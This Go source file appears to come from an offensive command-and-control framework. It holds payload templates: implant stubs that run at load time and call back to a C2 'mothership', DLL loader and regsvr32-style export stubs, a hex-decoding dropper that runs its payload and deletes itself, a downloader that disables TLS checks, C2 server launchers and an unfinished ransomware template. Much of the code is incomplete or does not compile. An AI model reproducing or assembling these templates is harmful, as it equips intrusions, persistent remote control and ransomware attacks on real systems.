package lib

/*
package main
import (
  "github.com/alphamystic/odin/wheagle/server/agent"
)

func init(){
  agent.Dubois("{{.Session}}")
}

func main(){}
*/

var GrpcMule = `
  package main
  import (
    "github.com/alphamystic/odin/lib/c2"
    "github.com/alphamystic/odin/wheagle/server/agent"
  )

  func init(){
    // manually populate the minion
    session := &c2.Session{
      ID: "{{.ID}}",
      MotherShipID:"{{.MotherShipID}}",
      Expiry: "{{.Expiry}}",
      Active: true,
      SessionID:"{{.SessionID}}",
    }
    implant := &agent.Implant{
      Address: "{{.Address}}",
      TunnelAddress: "{{.TunnelAddress}}",
      ISession: session,
    }
    implant.RunGRPCImplant()
  }
  func main(){}
  `

var HttpMule = `
  package main
  import (
    "github.com/alphamystic/odin/lib/c2"
    "github.com/alphamystic/odin/wheagle/server/agent"
  )

  func init(){
    session := &c2.Session{
      ID: "{{.ID}}",
      MotherShipID:"{{.MotherShipID}}",
      Expiry: "{{.Expiry}}",
      Active: true,
      SessionID:"{{.SessionID}}",
    }
    implant := &agent.Implant{
      Address: "{{.Address}}",
      TunnelAddress: "{{.TunnelAddress}}",
      ISession: session,
    }
    implant.RunHTTPImplant()
  }
  func main(){}
`

var AdminGRPC = `
package main

import (
  "fmt"
  "github.com/alphamystic/odin/lib/c2"
  "github.com/alphamystic/odin/wheagle/server/lib"
)

func main(){
  fmt.Println("Are even incide here!!!!!!!!!!!!!!")
  var ac2 = &c2.AdminC2{
    Name: "{{.Name}}",
    Password: "{{.Password}}",
    MSId: "{{.MSId}}",
    Address: "{{.Address}}",
    OPort: {{.OPort}},
    OProtocol: "{{.OProtocol}}",
    ImplantPort: {{.ImplantPort}},
    ImplantProtocol: "{{.ImplantProtocol}}",
    ImplantTunnel: "{{.ImplantTunnel}}",
    AdminTunnel: "{{.AdminTunnel}}",
  }
  var ad = lib.AdminData{
    Ad: ac2,
  }
  ad.RunMothershipGRPC()
}
`
var AdminHTTP = `
package main

import (
  "fmt"
  "github.com/alphamystic/odin/lib/c2"
  "github.com/alphamystic/odin/wheagle/server/lib"
)

func main(){
  fmt.Println("Are even incide here!!!!!!!!!!!!!!")
  var ac2 = &c2.AdminC2{
    Name: "{{.Name}}",
    Password: "{{.Password}}",
    MSId: "{{.MSId}}",
    Address: "{{.Address}}",
    OPort: {{.OPort}},
    OProtocol: "{{.OProtocol}}",
    ImplantPort: {{.ImplantPort}},
    ImplantProtocol: "{{.ImplantProtocol}}",
    ImplantTunnel: "{{.ImplantTunnel}}",
    AdminTunnel: "{{.AdminTunnel}}",
  }
  var ad = lib.AdminData{
    Ad: ac2,
  }
  ad.RunMothershipHTTP()
}
`

var honeyBadger = `
package main
import (
  "github.com/alphamystic/odin/lib/core"
)
func init(){
  hb := &core.ImplantWrapper{
    Address string
    MothershipID string
    Tls bool
    RootPem []byte
  }
  hb.RunAgent()
}
func main{}
`
var WindowsBootKit = ``
var LinuxBootKit = ``

var DLLLoaderMinion = `
package main
import (
  "github.com/alphamystic/odin/lib/c2"
  "github.com/alphamystic/odin/wheagle/server/agent"
)

import "C"
//export {{.EntryPoint}}
func {{.EntryPoint}}(){
  session := &c2.Session{
    ID: "{{.ID}}",
    MotherShipID:"{{.MotherShipID}}",
    Expiry: "{{.Expiry}}",
    Active: true,
    SessionID:"{{.SessionID}}",
  }
  implant := &agent.Implant{
    Address: "{{.Address}}",
    TunnelAddress: "{{.TunnelAddress}}",
    ISession: session,
  }
  implant.RunImplant()
}
func main(){}
`

var SelfWriter = `package main
import(
  "os"
  "fmt"
  "encoding/hex"
)
func init(){
  data := {{.Data}}
  name := {{.Name}}
  dcd,err := hex.DecodeString(data)
  if err != nil{
    fmt.Println(err);return
  }
  err := os.WriteFile(name,dcd,0755)
  if err !=nil {fmt.Println(err)}
  switch runtime.GOOS {
  case "windows":
    _,err = exec.Command(".\"+name).CombinedOutput()
    if err != nil{
      fmt.Println(err);return
    }
  case "linux":
    _,err = exec.Command("./"+name).CombinedOutput()
    if err != nil{
      fmt.Println(err);return
    }
  default:
  }
}
func main()  {
  _ = os.Remove(os.Args[0])
  os.Exit()
}
`

var WindowsInjector = `
package main
import (
  "github.com/alphamystic/odin/lib/penguins/zoo"
)
`

var Downloader = `
package main
import(
  "fmt"
  "bytes"
  "net/http"
)
func main(){
  dwldUrl = {{.DownloadUrl}}
  var client = new(http.Client)
  if strings.Contains(dwldUrl,"https") {
		client = &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		}
	} else {
		client = &http.Client{}
	}
  req,err := http.NewRequiest("GET",dwldUrl)
  if err != nil{
    panic(err)
  }
  body,err := client.Do(req)
  if err != nil{ panic(err) }
  defer body.Body.Close()
  buf := bytes.NewBuffer([]byte{})
	_, err = io.Copy(buf, resp.Body)
	if err != nil {
		panic(err)
	}
  sc := buf.Bytes()
  //write it to file
  err := os.WriteFile(name,sc,0755)
  if err !=nil {fmt.Println(err)}
}`

var DLLLoaderAdmin = `
package main

import (
  "fmt"
  "github.com/alphamystic/odin/lib/c2"
  "github.com/alphamystic/odin/wheagle/server/lib"
)
import "C"
//export {{.EntryPoint}}
func {{.EntryPoint}}(){
  fmt.Println("Are even incide here!!!!!!!!!!!!!!")
  var ac2 = &c2.AdminC2{
    Name: "{{.Name}}",
    Password: "{{.Password}}",
    MSId: "{{.MSId}}",
    Address: "{{.Address}}",
    OPort: {{.OPort}},
    OProtocol: "{{.OProtocol}}",
    ImplantPort: {{.ImplantPort}},
    ImplantProtocol: "{{.ImplantProtocol}}",
    ImplantTunnel: "{{.ImplantTunnel}}",
    AdminTunnel: "{{.AdminTunnel}}",
  }
  var ad = lib.AdminData{
    Ad: ac2,
  }
  ad.RunMothership()
}
`
// win injectors
var DllMuleRGSRV =`
package main

import "C"

//export RGSRVR
func RGSVR(){
  main_RGSRV()
}

//export {{.EntryPoint}}
func {{.EntryPoint}}() bool { return true }
//export DllRegisterServer
func DllRegisterServer() bool { return true }
func DllInstall() bool {
  main_RGSRV()
  return true
}

`

// go plugins (add the return values)
var MinionLib = `package main
import (
  "github.com/alphamystic/odin/lib/c2"
  "github.com/alphamystic/odin/wheagle/server/agent"
)
func {{.EntryPoint}}(){
  session := &c2.Session{
    ID: "{{.ID}}",
    MotherShipID:"{{.MotherShipID}}",
    Expiry: "{{.Expiry}}",
    Active: true,
    SessionID:"{{.SessionID}}",
  }
  implant := &agent.Implant{
    Address: "{{.Address}}",
    TunnelAddress: "{{.TunnelAddress}}",
    ISession: session,
  }
  implant.RunImplant()
}`

var AdminLib = `
package main

import (
  "fmt"
  "github.com/alphamystic/odin/lib/c2"
  "github.com/alphamystic/odin/wheagle/server/lib"
)

func {{.EntryPoint}}(){
  fmt.Println("Are even incide here!!!!!!!!!!!!!!")
  var ac2 = &c2.AdminC2{
    Name: "{{.Name}}",
    Password: "{{.Password}}",
    MSId: "{{.MSId}}",
    Address: "{{.Address}}",
    OPort: {{.OPort}},
    OProtocol: "{{.OProtocol}}",
    ImplantPort: {{.ImplantPort}},
    ImplantProtocol: "{{.ImplantProtocol}}",
    ImplantTunnel: "{{.ImplantTunnel}}",
    AdminTunnel: "{{.AdminTunnel}}",
  }
  var ad = lib.AdminData{
    Ad: ac2,
  }
  ad.RunMothership()
}
`

var RansomWheagle =`
package main

import (
  "os"
  "fmt"
  "github.com/alphamystic/odin/lib/utils"
)

func init(){
  const KEY := {{.Key}}
  user,err := utils.GetUser()
  if err != nil {
    ErrorOut(fmt.Sprintf("%s",err))
  }
  switch runtime.GOOS {
  case "windows":
    //open windows directories and do something
    err = os.MkdirAll(user.HomeDir + "\\" +"WHEAGLE_RANSOMWARE_SIMULATOR" )
  case "linux":
    //open home/user
    err = os.MkdirAll(user.HomeDir + "/" +"WHEAGLE_RANSOMWARE_SIMULATOR" )
    if err != nil{
      ErrorOut(fmt.Sprintf("%s",err))
    }
    //write the key somewhere
    // create randome files
    for i := 0
  case "darwin":
  case "android":
  default:
    fmt.Println("You lucky Bastard!!!!!!!!")
    _ = os.Remove(os.Args[0])
    os.Exit(0)
  }
}
func main(){
  fmt.Println("This is actually very illegal and shouldn't be used on any system...")
  _ = os.Remove(os.Args[0])
  os.Exit(0)
}

func ErrorOut(text string){
  fmt.Println(text)
  _ = os.Remove(os.Args[0])
  os.Exit(0)
}
`

/* BLUE TEAM */
// @TODO Push this to bt
var SysmonReader = ``
/* End of Blue Team Templates */

/* Assist Binaries */
var Anaconda = `
package main
import (
  "net/http"
  "odin"/lib/utils
  )

  func main(){
    utils.PrintTextInASpecificColorInBold("cyan","======================================================")
    utils.NoNewLine("cyan","=======    ********************************    =======\n")
    utils.NoNewLine("cyan","=======         ")
    utils.NoNewLine("white"," ANACONDA FILE SERVER  ")
    utils.NoNewLine("cyan","         =======\n")
    utils.NoNewLine("cyan","========        ***************                =======\n")
    utils.PrintTextInASpecificColorInBold("cyan","======================================================")
    http.Handle("/",http.StripPrefix("/",http.FileServer(http.Dir(./))))
    utils.PrintTextInASpecificColor("blue","Anaconda serving files at 0.0.0.0:33333 on directory ./")
    utils.Logerror(http.ListenAndServe("0.0.0.0:33333",nil))
  }
`

var ApachePersist = ``
/*

package main

import (
  "fmt"
  "github.com/alphamystic/odin/lib/c2"
  "github.com/alphamystic/odin/wheagle/server/lib"
)

func main(){
  fmt.Println("Are even incide here!!!!!!!!!!!!!!")
  var ac2 = &c2.AdminC2{
    Name: "okay",
    Password: "$2a$12$u4EPgWbKeI.Ej2W4vWGOEeeXMYNHVC9e1/P9.xtxk9SszybF33OVq",
    MSId: "9b47d0ca50df8f2304fc4a1e3d55a7a9",
    Address: "0.0.0.0",
    OPort: 45566,
    OProtocol: "tcp",
    ImplantPort: 44566,
    ImplantProtocol: "tcp",
    ImplantTunnel: "",
    AdminTunnel: "",
  }
  var ad = lib.AdminData{
    Ad: ac2,
  }
  ad.RunMothership()
}

*/
